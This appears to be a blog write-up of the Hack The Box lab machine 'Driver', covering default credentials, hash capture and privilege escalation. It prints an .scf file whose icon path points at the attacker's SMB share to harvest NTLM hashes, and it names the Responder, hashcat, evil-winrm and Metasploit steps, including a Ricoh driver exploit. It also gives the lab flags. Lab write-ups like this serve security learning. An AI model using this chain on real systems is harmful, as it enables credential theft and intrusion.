---
title: 'driver.htb'
date: 2022-06-23
description: 'Writeup for Driver, from HTB.'
---
## Enumeration
Initial port enumeration with rustscan revealed the ports 80, 135, 445, and 5985 as open; each running the typical service found on those ports.

Navigation to the machine’s http endpoint revealed a prompt for basic authentication with the realm “MFP Firmware Update Center.” A quick google searched returned the [MFP Server User Manual](http://download.level1.com/level1/manual/MFP_UM.pdf) which details the default login credentials as `admin:admin`.

## Foothold
After authenticating, I’m greeted by a simple web page with a few different directories. All of them redirect to the current page aside from “Firmware Updates” which redirects to the `/fw_up.php` endpoint.

This endpoint exposes a file upload form intended to update printer firmware. Since this is almost certainly a Windows machine with SMB enabled, it’s possible that the path onto this machine will involve capturing a user’s NTLM hash.

After testing some filetypes and realizing that the upload almost certainly accepts any arbitrary file, I upload a file ending in .scf with the following contents:

```text
[Shell]
Command=2
IconFile=\<MY BOX IP>share\test.ico
[Taskbar]
Command=ToggleDesktop
```

I simultaneously also run responder to listen for any SMB traffic and sure enough the machine attempts to load the IconFile resource through SMB on my machine and sends in its NTLM hash. Here’s an abbreviate version of responder’s output:

```text
[SMB] NTLMv2 Client   : ::ffff:10.10.11.106
             Username : DRIVER\tony
             Hash     : <Hash Redacted for Brevity>
```

I pop this NTLMv2 hash into hashcat and throw the rockyou wordlist at it. It promptly returns the user’s password.

Using evil-winrm I’m able to log in as that user and get the first flag.

```text
$ evil-winrm -i driver.htb -u tony  
Enter Password: 

<Evil-WinRM Wall Redacted for Brevity>

*Evil-WinRM* PS C:Users\tonyDocuments> cd ../desktop
*Evil-WinRM* PS C:Users\tonydesktop> cat user.txt
2af2ffb272574074276da10ea3b7e648
```

## Privilege Escalation(s)
While looking around the machine, I find a suspicious directory in `C:\temp\`. Contains a variety of files including .dll files. I pull the readme onto my machine and see that this directory contains files for “PCL6 Driver for Universal Print.”

```text
*Evil-WinRM* PS C:\tempz87179L19disk1> ls
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/28/2019   1:06 PM          43638 Readme.html

<Output Redacted for Brevity>

-a----        6/10/2019   1:17 PM           1862 ricu0nur.dl_
```

A google search shows a functioning Metasploit module to exploit a [privilege escalation vulnerability](https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) with this driver.

I create a Metasploit payload with msfvenom and switch over from evil-winrm. I set up the Metasploit privesc and run it but unfortunately the exploit completes without a new session. After some troubleshooting I end up migrating processes before re-running the exploit and it works.

```text
msf6 exploit(windows/local/ricoh_driver_privesc) > run

<Output Redacted for Brevity>

msf6 exploit(windows/local/ricoh_driver_privesc) > sessions
1 meterpreter x86/windows  DRIVER\tony @ DRIVER
2 meterpreter x64/windows  NT AUTHORITYSYSTEM @ DRIVER
```

From here I can load the SYSTEM session and drop into a shell to grab the root flag.

```text
C:Windowssystem32>whoami
whoami
nt authoritysystem
C:UsersAdministratorDesktop>type root.txt
7353d7ff624e80852aad9ae38e6cfe2a
```